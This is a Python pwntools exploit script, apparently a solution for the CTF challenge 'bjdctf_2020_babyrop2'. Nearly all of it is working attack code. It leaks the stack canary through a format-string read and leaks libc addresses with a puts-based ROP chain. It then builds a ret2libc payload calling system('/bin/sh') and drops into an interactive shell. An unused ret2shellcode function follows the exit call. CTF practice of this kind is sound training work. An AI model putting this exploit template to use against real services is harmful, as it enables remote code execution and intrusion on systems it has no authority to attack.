import sgtlibc
import time
from typing import List
from pwn import *
import os


class Util:
    def use_randoms(length: int, char: chr = None, encoding: str = 'ascii'):
        if not enable_use_randoms or char:
            if not char:
                char = 'a'
            r = char * length
        else:
            r = randoms(length, string.ascii_letters)
        return r.encode(encoding)

    def start_process(target: str):
        os.system(f'chmod 777 {target}')
        p = process(target)
        return p


def se(data): return r.send(data)
def sa(delim, data): return r.sendafter(delim, data)
def sl(data): return r.sendline(data)
def sla(delim, data): return r.sendlineafter(delim, data)
def sea(delim, data): return r.sendafter(delim, data)
def rc(numb=4096): return r.recv(numb)
def rl(): return r.recvline()
def ru(delims): return r.recvuntil(delims)
def uu32(data): return u32(data.ljust(4, b'\0'))
def uu64(data): return u64(data.ljust(8, b'\0'))
def info_addr(tag, addr): return r.info(tag + ': {:#x}'.format(addr))


r = None
use_randoms = Util.use_randoms


def start_game():
    global is_local
    local = is_local
    if local:
        global target
        return Util.start_process(target)
    else:
        global target_host
        return remote(target_host[0], target_host[1])


enable_use_randoms = False
is_local = True
target: str = './bjdctf_2020_babyrop2'
target_host = ('redirect.do-not-trust.hacking.run', 10303)

context.os = 'linux'
context.arch = 'amd64'  # i386 amd64
context.log_level = 'debug'
elf = ELF(target)  # load target and show its checksec


# def get_format_position():
#     '''
#     通过格式化字符串找到输入值的位置
#     '''
#     pos = 1
#     global r
#     while True:
#         r = start_game()
#         sla('u!\n', f'AA%{pos}$p')
#         data = rl()[2:].decode().strip()
#         r.close()
#         if data.endswith(b'AA'.hex()):
#             print('find position:', pos)
#             return pos
#         pos += 1


input_position = 6  # get_format_position()  # = 6
cookie_position = input_position + 1  # canary's is after input item
r = start_game()
# time.sleep(10)

main_addr = p64(elf.symbols['main'])
exit_addr = p64(0x0400928)
plt_write = p64(elf.plt['puts'])
pop_rdi = p64(0x0400993)
pop_rsi_r15 = p64(0x0400991)
rop_ret = p64(0x04005f9)
padding = b'a' * 24


def get_cookie():
    global cookie_position
    sla('u!\n', f'%{cookie_position}$p')
    cookie = int(rl().strip(), 16)
    print('cookie now', hex(cookie))
    return cookie


def leak(func_name: str):
    cookie = get_cookie()
    got_addr = p64(elf.got[func_name])
    payload = padding + p64(cookie) + p64(0xdeadbeaf)
    # write(fd,content,length)
    payload += pop_rdi + got_addr + plt_write + main_addr
    sla(b'story!\n', payload)
    # addr's should be 00007fxxxxxxxx,so we get 6bytes is enough
    data = rc(6).ljust(8, b'\0')
    print('data', data)
    write_addr = struct.unpack('<q', data)[0]
    print(f'{func_name}_addr', hex(write_addr))
    return write_addr


s = sgtlibc.Searcher()


def leak_add(name: str):
    r = leak(name)
    s.add_condition(name, r)
    return r


write_addr = leak_add('puts')
leak_add('read')
leak_add('__libc_start_main')

libc = s.dump()
# time.sleep(10)
offset = write_addr - libc[sgtlibc.s_puts]  # libc_write
system_addr = p64(libc[sgtlibc.s_system] + offset)
binsh_addr = p64(libc[sgtlibc.s_binsh] + offset)

cookie = get_cookie()
payload = padding + p64(cookie) + p64(0xdeadbeaf) + \
    pop_rdi + binsh_addr + system_addr + main_addr
sa('story!', payload)
r.interactive()
sys.exit(0)
gamebox = ELF(target)


def ret2shellcode():
    sh = asm(shellcraft.sh())
    p1 = sh
    sla('name\n', p1)
    name_addr = 0x601080
    p2 = flat(['a'*0x28, name_addr])
    sla('me?\n', p2)
    r.interactive()
    pass
